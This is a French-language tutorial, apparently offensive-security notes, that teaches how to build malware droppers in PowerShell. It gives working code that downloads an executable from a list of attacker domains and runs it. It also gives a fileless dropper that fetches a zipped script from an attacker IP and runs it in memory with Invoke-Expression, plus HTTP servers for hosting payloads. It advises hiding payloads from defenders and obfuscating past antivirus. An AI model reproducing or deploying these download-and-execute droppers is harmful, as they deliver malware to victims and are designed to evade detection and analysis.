
La plupart des malwares ne sont pas distribué en un seul fichier et fonctionne en 2 étages :

# __Dropper___

Afin **télécharger** et d'**éxecuter** le malware **en mémoire**, on va faire éxecuter un **dropper** qui va faire appel à un domaine infecté pour télécharger notre payload.

Notez qu'il est conseillé de mettre une authentification web au téléchargement dans le but d'éviter une collecte par des blueTeamers qui aurai vu passer le flux sans avoir accès au code du dropper.

Ces droppers sont très souvent repéré par les AV, on doit donc utiliser des techniques d'obfuscations afin de passer à travers et

### Exemple

Avec powershell ce code ressemblerai à cela :

```powershell
$wvh = new-object net.webclient;
$nsh='http://<InfectedDomain1>/trkldl@http://<InfectedDomain2>/adCa0ad@http://<InfectedDomain3>/bl4bl4c4r'.split("@");
$onj = '453';
$dxo=$env:temp+'\'+$onj+'.exe';
foreach($wzi in $nsh){
	try{
		$wvh.downloadfile($wzi, $dxo);
		if((get-item $dxo).length -ge 80000){
			invoke-item $dxo;
			break;
		}	
	}catch{}
}
```

Pour résumer ce payload va :
- **Creer un objet pour telecharger**
- **Faire une liste des liens où trouver le malware**
- **Télécharger** puis **executer** le premier fichier qui aura une taille > 80000

## __Telechargement__

Windows 10 et + :

```powershell
Invoke-WebRequest -Uri 'http://<MACHINE_IP>:8000/Virus.zip' -outfile "virus.zip";
```

Windows 7 et - :

```powershell
# Creation d'un nouveau client web
$webClient = [System.Net.WebClient];

# Telechargement des donnes dans une variable
$zip = $webClient.DownloadData('http://<MachineIP>:8000/Virus.zip');
```


## __Extraction__

Une fois l'étape précédente effectué, le ZIP se trouve en mémoire dans la variable $zip. On doit donc les extraire en restant en mémoire.

```powershell
# Chargement de la bibliothèque System.IO.Compression
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null;

# Ouverture du fichier 'Virus.ps1' dans l'objet zip en mémoire
$entry = (New-Object System.IO.Compression.ZipArchive(New-Object System.IO.MemoryStream (, $zip))).GetEntry('Virus.ps1');

# Décompression du fichier
$b = [byte[]]::new($entry.Length);
$entry.Open().read($b, 0, $b.Length);

# Conversion en texte UTF8
$code = [System.Text.Encoding]::UTF8.GetString($b);
```


## __Execution__

Une fois le payload stocké en mémoire il ne reste plus qu'à l'éxécuter.

```powershell
$code | Invoke-Expression
```


## __Exemple_Memory_Dropper___

En combinant tout cela on peut faire un dropper fonctionnant exclusivement dans la mémoire :

```powershell
$webClient = [System.Net.WebClient];
$zip = $webClient.DownloadData('http://<MACHINE_IP>:8000/Virus.zip');
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null;
$entry = (New-Object System.IO.Compression.ZipArchive(New-Object System.IO.MemoryStream (, $zip))).GetEntry('Virus.ps1');
$b = [byte[]]::new($entry.Length);
$entry.open().Read($b, 0, $b.Length);
$code = [System.Text.Encoding]::UTF8.GetString($b);
$code | iex;
```


# __Downloading_Server___

Pour télécharger notre payload depuis la cible, on doit mettre en place un serveur HTTP.

## Python

On peut utiliser python qui nous crée un server web très facilement.

```shell
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Powershell

Si l'on veut rester en powershell on peut utiliser ce code :

```powershell
Function New-SimpleHTTPListener {
	# Port en écoute
	Param(
		[Parameter()] [Int] $Port = 8000
	)

	# Par défaut en écoute sur localhost
	Begin{
		$listener = New-Object System.Net.HttpListener;
		$prefix = "http://localhost:$Port";
		$listener.Prefixes.Add($prefix);	
	}

	Process {
		try{
			# Demarrer le serveur
			$listener.Start();
			$pwd = Get-Location;

			# Attendre les connexions
			while($listener.IsListening){
				$context = $listener.GetContext();

				# terminer le serveur si l'url demandé est '/quit'
				if($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/quit'){
					$listener.Close();
					break;
				}

				# Préparer la réponse
				$HTTPresponse = $context.Response;
				$HTTPresponse.StatusCode = "200";
				$HTTPresponse.Headers.Add("Content-Type", "text/text");

				# Lire le fichier demandé par l'URL
				$requestUrl = $context.Request.Url.OriginalString;
				$data = [System.Text.UTF8Encoding]::UTF8.GetBytes([System.IO.File]::ReadAllText(Join-Path "$pwd" ($RequestUrl.split('/')[-1])));

				# Renvoyer le contenu du fichier en réponse
				$HTTPresponse.ContentLength64 = $data.Length;
				$output = HTTPresponse.OutputStream;
				$output.Write($data, 0, $data.Length);

				# Fermer la connexion
				$output.Close();
			}
		}catch{
			Write-Host "erreur : $_";
		}Finally{
			Write-Host "Fin d'éxécution : $_";
			$listener.stop();
		}
	}

	End {
	
	}
}
```

